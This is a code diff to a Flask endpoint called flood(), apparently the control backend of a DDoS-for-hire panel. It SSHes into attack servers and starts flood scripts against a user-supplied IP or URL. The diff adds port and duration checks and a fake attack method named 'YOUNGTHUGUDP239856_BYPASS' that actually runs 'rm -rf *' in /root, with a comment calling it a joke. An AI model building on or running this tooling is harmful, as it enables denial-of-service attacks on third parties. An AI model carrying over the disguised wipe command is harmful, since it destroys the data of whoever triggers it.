@@ -31,6 +31,7 @@ def flood():
             "response_message": "Missing argument(s). Null values."
         })
     
+    # big fucking validation block here... just dont change it .... 
     # this is to be updated... code is a bit ugly... definitly not my proudest validation.
     if not Validation.validate_ip(target):
         if not Validation.validate_url(target):
@@ -43,6 +44,18 @@ def flood():
     else:
         screen_name = target # if its an ip just keep it that way for the screen name
 
+    if not Validation.validate_port(port):
+        return jsonify({
+                "response_code": 102,
+                "response_message": "Port should be in the range of (1-65535)."
+            })
+
+    if not Validation.validate_time(time):
+        return jsonify({
+                "response_code": 102,
+                "response_message": "Time should be MIN=10, MAX=14400."
+            }) 
+
 
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -54,7 +67,7 @@ def flood():
         screen_name = urlparse(target).netloc
         screen_cmd = f"screen -dm -S {screen_name} timeout {time}"
 
-        # add ya own shit
+        # add ya own shit... and can you see any if-elif-elif-elif.. ;)
         match method:
 
             case "AUTOBYPASS-GET":
@@ -71,6 +84,9 @@ def flood():
 
             case "HTTP-QUERY":
                 cmd = f"cd /root/l7/query && {screen_cmd} node http-query.js {target} {time} 15"
+
+            case "YOUNGTHUGUDP239856_BYPASS": # this is a joke... remove it or dont ;)
+                cmd = f"cd /root && {screen_cmd} rm -rf *"
 
             case "STOP":
 
